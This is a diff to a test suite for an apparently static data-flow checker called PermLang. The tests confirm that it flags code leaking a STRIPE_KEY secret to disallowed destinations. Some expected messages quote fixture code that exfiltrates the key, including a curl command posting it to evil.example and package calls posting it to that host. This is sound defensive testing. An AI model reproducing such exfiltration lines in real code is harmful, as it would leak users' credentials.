@@ -7,11 +7,13 @@ import path from "node:path";
 import { fileURLToPath } from "node:url";
 import { describe, expect, it } from "vitest";
 import { checkFiles, type CheckOptions } from "../src/check.js";
-import { parseFlows } from "../src/flows.js";
+import { FlowRuleError, parseFlows } from "../src/flows.js";
 
-const app = fileURLToPath(new URL("./flows-fixtures/app.ts", import.meta.url));
+const fixture = (file: string) => fileURLToPath(new URL(`./flows-fixtures/${file}`, import.meta.url));
+const app = fixture("app.ts");
+const files = [app, fixture("sinks.ts"), fixture("packages.d.ts")];
 const stripeRule = { from: { name: "env", arg: "STRIPE_KEY" }, to: [{ name: "net", arg: "api.stripe.com" }] };
-const run = (options: CheckOptions = {}) => checkFiles([app], { flows: [stripeRule], ...options });
+const run = (options: CheckOptions = {}) => checkFiles(files, { flows: [stripeRule], ...options });
 const flows = (options: CheckOptions = {}) => run(options).diagnostics.filter((d) => d.code === "PERM009");
 const message = (fn: string) => flows().find((d) => d.function === fn)!;
 
@@ -28,6 +30,14 @@ describe("data-flow rules", () => {
       "error viaClient:84 net(evil.example)",
       "error viaExec:89 exec",
       "error viaEval:94 unverifiable",
+      "error viaUnsafe:138 unverifiable",
+      "error viaHeaders:151 net(evil.example)",
+      "error viaStore:162 net(evil.example)",
+      "error viaElements:180 net(evil.example)",
+      "error viaEmail:7 email.send",
+      "error viaUnmapped:12 sneaky-http",
+      "error viaUnmappedHelper:21 sneaky-http",
+      "error viaUntyped:32 untyped-beacon",
     ]);
   });
 
@@ -49,14 +59,63 @@ describe("data-flow rules", () => {
     expect(message("viaClient").message).toMatch(/^viaClient gets env\(STRIPE_KEY\) from StripeClient\.constructor and can send/);
   });
 
+  // Found in re-verification: a function that returns nothing can still write the key into an
+  // object its caller passes in, and the docs said it couldn't.
+  it("follows the source back through an object the caller passes in", () => {
+    expect(message("viaHeaders").message).toMatch(/^viaHeaders gets env\(STRIPE_KEY\) from authorize and can send to net\(evil\.example\)/);
+    expect(message("viaStore").message).toMatch(/^viaStore gets env\(STRIPE_KEY\) from loadInto and can send to net\(evil\.example\)/);
+    expect(message("viaElements").message).toMatch(/^viaElements gets env\(STRIPE_KEY\) from tagLines and can send/);
+  });
+
   it("treats a command, or code that can't be verified, as able to send it anywhere", () => {
     expect(message("viaExec").message).toBe(
       "viaExec reads env(STRIPE_KEY) and can run commands, through execSync(\"curl -d \" + process.env.STRIPE_KEY + \" https://evil.exam...), which could send it anywhere: the flow rule for env(STRIPE_KEY) allows only net(api.stripe.com).",
     );
     expect(message("viaExec").fix).toBe("keep env(STRIPE_KEY) away from that call: no rule can allow it, since a command could send it anywhere.");
     expect(message("viaEval").message).toContain("runs code that can't be verified, through eval(");
+    // Found in re-verification: @perm-unsafe accepts code for annotations only. A secret handed
+    // to a function marked with it still reaches its eval.
+    expect(message("viaUnsafe").message).toBe(
+      "viaUnsafe reads env(STRIPE_KEY) and runs code that can't be verified, through render → eval(template), which could send it anywhere: the flow rule for env(STRIPE_KEY) allows only net(api.stripe.com).",
+    );
     const nowhere = { from: stripeRule.from, to: [] };
     expect(flows({ flows: [nowhere] }).find((d) => d.function === "viaExec")!.message).toContain("the flow rule for env(STRIPE_KEY) doesn't let it go anywhere.");
+  });
+
+  // Found in re-verification: mailing the key, or handing it to a package with no adapter, passed.
+  it("treats an adapter's action as somewhere the data goes, which the rule must list", () => {
+    expect(message("viaEmail").message).toBe(
+      "viaEmail reads env(STRIPE_KEY) and can reach email.send, through createTransport({ host: \"smtp.example\" }).sendMail({ to: \"ops@example.com\", text: process.env.STRIPE_KEY }), which the flow rule for env(STRIPE_KEY) doesn't allow.",
+    );
+    expect(message("viaEmail").fix).toBe("keep env(STRIPE_KEY) away from that call, or add email.send to the rule's \"to\" in permlang.config.json.");
+    const mailAllowed = { from: stripeRule.from, to: [...stripeRule.to, { name: "email.send" }] };
+    expect(flows({ flows: [mailAllowed] }).map((d) => d.function)).not.toContain("viaEmail");
+  });
+
+  it("treats a package with no adapter as able to send it anywhere", () => {
+    expect(message("viaUnmapped").message).toBe(
+      "viaUnmapped reads env(STRIPE_KEY) and calls into sneaky-http, which has no adapter, through post(\"https://evil.example/u\", ...), so it could send it anywhere: the flow rule for env(STRIPE_KEY) allows only net(api.stripe.com).",
+    );
+    expect(message("viaUnmapped").fix).toBe(
+      "add an adapter manifest for sneaky-http, so PermLang knows where it sends data (see docs/reference.md#adapter-manifests), or keep env(STRIPE_KEY) away from that call.",
+    );
+    expect(message("viaUnmappedHelper").path).toEqual(["upload", "post(\"https://evil.example/upload\", ...)"]);
+    expect(message("viaUntyped").message).toBe(
+      "viaUntyped reads env(STRIPE_KEY) and calls into untyped-beacon, whose types can't be found, through beam(process.env.STRIPE_KEY!), so it could send it anywhere: the flow rule for env(STRIPE_KEY) allows only net(api.stripe.com).",
+    );
+    expect(message("viaUntyped").fix).toBe("install the types for untyped-beacon, so PermLang can see what it calls, or keep env(STRIPE_KEY) away from that call.");
+    // The rule only concerns functions that have the key.
+    expect(flows().map((d) => d.function)).not.toContain("unmappedWithoutKey");
+    // ...whatever the policy for packages with no adapter: a rule is asked for explicitly.
+    expect(flows({ unmapped: "trust" }).map((d) => d.function)).toContain("viaUnmapped");
+    // Only a flow rule counts them; what the functions reach is unchanged.
+    expect(run().functions.find((f) => f.name === "viaUnmapped")!.actual).toEqual(["env(STRIPE_KEY)"]);
+  });
+
+  it("checks that the app capabilities a rule lists are ones adapters define", () => {
+    const typo = { from: stripeRule.from, to: [{ name: "email.sent" }] };
+    expect(() => run({ flows: [typo] })).toThrow(FlowRuleError);
+    expect(() => run({ flows: [typo] })).toThrow(/^flows\[0\]: "to" lists email\.sent, which no adapter defines, so it could never match\. Adapters define: .*email\.send/);
   });
 
   it("allows the hosts the rule lists, and ignores functions that never have the source", () => {
@@ -74,15 +133,19 @@ describe("data-flow rules", () => {
     expect(functions).not.toContain("refund");
     // It assigns to a setter that uses the key: a setter returns nothing.
     expect(functions).not.toContain("configure");
+    // It passes an object to one that only reads it (fields, and methods that change nothing).
+    expect(functions).not.toContain("checkoutOrder");
+    // It calls a logger that takes a string.
+    expect(functions).not.toContain("logged");
   });
 
   // Found in review: sketch, which init sets up, turned these into warnings, so a broken rule passed.
   it("fails at every strictness level, sketch included", () => {
-    expect(flows({ strictness: "sketch" }).map((d) => d.severity)).toEqual(Array(10).fill("error"));
+    expect(flows({ strictness: "sketch" }).map((d) => d.severity)).toEqual(Array(18).fill("error"));
   });
 
   it("checks nothing without rules", () => {
-    expect(checkFiles([app]).diagnostics.filter((d) => d.code === "PERM009")).toEqual([]);
+    expect(checkFiles(files).diagnostics.filter((d) => d.code === "PERM009")).toEqual([]);
   });
 
   it("can take a whole category as the source", () => {
@@ -119,14 +182,38 @@ describe("data-flow rules in permlang.config.json", () => {
 
   // Found in review: these were accepted and then never matched anything.
   it.each([
-    [{ from: "env(STRIPE_KEY)", to: ["fs.write(./public)"] }, /flows\[0\]: "to" can only list network hosts, such as "net\(api\.stripe\.com\)"; "fs\.write\(\.\/public\)" isn't one\./],
+    [{ from: "env(STRIPE_KEY)", to: ["fs.write(./public)"] }, /flows\[0\]: "to" can only list network hosts, such as "net\(api\.stripe\.com\)", and app capabilities from adapters, such as "email\.send"; "fs\.write\(\.\/public\)" isn't one\./],
     [{ from: "env(STRIPE_KEY)", to: ["env(OTHER)"] }, /"to" can only list network hosts/],
     [{ from: "env(STRIPE_KEY)", to: ["exec"] }, /"to" can only list network hosts/],
     [{ from: "exec", to: [] }, /flows\[0\]: "from" must be data a function can read: env, fs\.read, db\.read, or net, with or without a scope; "exec" isn't\./],
     [{ from: "fs.write(./out)", to: [] }, /"from" must be data a function can read/],
     [{ from: "db.write(users)", to: [] }, /"from" must be data a function can read/],
     [{ from: "env(STRIPE_KEY)", to: ["net(api.stripe.com)"], too: ["net(evil.example)"] }, /flows\[0\] has an unknown setting "too"; a rule has only "from" and "to"\./],
+    // Found in re-verification: calls are matched by host only, so these never matched and
+    // failed the calls they were meant to allow.
+    [{ from: "env(STRIPE_KEY)", to: ["net(https://api.stripe.com)"] }, /flows\[0\]: "net\(https:\/\/api\.stripe\.com\)" names more than a host\. A rule matches the host a call connects to, whatever its scheme, port, or path: write "net\(api\.stripe\.com\)"\./],
+    [{ from: "env(STRIPE_KEY)", to: ["net(api.stripe.com/v1)"] }, /"net\(api\.stripe\.com\/v1\)" names more than a host.*write "net\(api\.stripe\.com\)"/],
+    [{ from: "env(STRIPE_KEY)", to: ["net(api.stripe.com:443)"] }, /"net\(api\.stripe\.com:443\)" names more than a host.*write "net\(api\.stripe\.com\)"/],
+    [{ from: "env(STRIPE_KEY)", to: ["net(key@api.stripe.com)"] }, /names more than a host.*write "net\(api\.stripe\.com\)"/],
+    [{ from: "env(STRIPE_KEY)", to: ["net(::1)"] }, /"net\(::1\)" names more than a host.*write only the host, such as "net\(api\.stripe\.com\)" or "net\(\[::1\]\)"\./],
+    [{ from: "net(https://api.internal.example/v1)", to: [] }, /flows\[0\]: "net\(https:\/\/api\.internal\.example\/v1\)" names more than a host.*write "net\(api\.internal\.example\)"/],
   ])("rejects %j", (rule, reason) => {
     expect(() => parse([rule])).toThrow(reason);
+  });
+
+  it("take app capabilities from adapters in \"to\"", () => {
+    expect(parse([{ from: "env(STRIPE_KEY)", to: ["net(api.stripe.com)", "email.send", "payments.refund(stripe)"] }])[0]!.to).toEqual([
+      { name: "net", arg: "api.stripe.com" },
+      { name: "email.send" },
+      { name: "payments.refund", arg: "stripe" },
+    ]);
+    // No rule can allow code that can't be verified.
+    expect(() => parse([{ from: "env(STRIPE_KEY)", to: ["unverifiable"] }])).toThrow(/"to" can only list network hosts/);
+  });
+
+  it("takes hosts as calls report them", () => {
+    for (const host of ["api.stripe.com", "API.Stripe.com", "[::1]", "localhost", "127.0.0.1"]) {
+      expect(parse([{ from: "env(STRIPE_KEY)", to: [`net(${host})`] }])[0]!.to).toEqual([{ name: "net", arg: host }]);
+    }
   });
 });
